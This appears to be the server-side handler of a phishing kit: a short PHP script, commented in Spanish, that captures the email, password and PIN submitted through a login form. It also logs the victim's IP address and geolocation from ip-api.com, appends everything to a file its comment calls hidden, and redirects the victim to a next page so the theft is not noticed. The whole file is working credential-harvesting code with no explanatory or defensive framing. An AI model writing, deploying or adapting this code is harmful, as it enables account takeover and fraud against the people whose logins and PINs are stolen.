<?php
date_default_timezone_set('America/Mexico_City');

// Capturar datos del formulario
$email    = $_POST['email'] ?? 'sin_email';
$password = $_POST['password'] ?? 'sin_clave';
$pin      = $_POST['pin'] ?? 'sin_pin';

// Capturar IP
$ip = $_SERVER['REMOTE_ADDR'] ?? 'Desconocida';

// Geolocalización con ip-api.com
$detalles = @json_decode(file_get_contents("http://ip-api.com/json/{$ip}"), true);
$pais     = $detalles["country"]     ?? 'No detectado';
$ciudad   = $detalles["city"]        ?? 'No detectada';
$region   = $detalles["regionName"]  ?? 'No detectada';

// Crear contenido para guardar
$contenido  = "----- NUEVO ACCESO -----\n";
$contenido .= "📅 Fecha: " . date("Y-m-d H:i:s") . "\n";
$contenido .= "📧 Correo: $email\n";
$contenido .= "🔑 Clave: $password\n";
$contenido .= "🔒 PIN: $pin\n";
$contenido .= "🌐 IP: $ip\n";
$contenido .= "🌍 País: $pais\n";
$contenido .= "🗺️ Región: $region\n";
$contenido .= "🏙️ Ciudad: $ciudad\n";
$contenido .= "------------------------\n\n";

// Guardar en archivo oculto
file_put_contents("feriado3.txt", $contenido, FILE_APPEND | LOCK_EX);

// Redirigir a la siguiente página
header("Location: index2.html");
exit();
?>
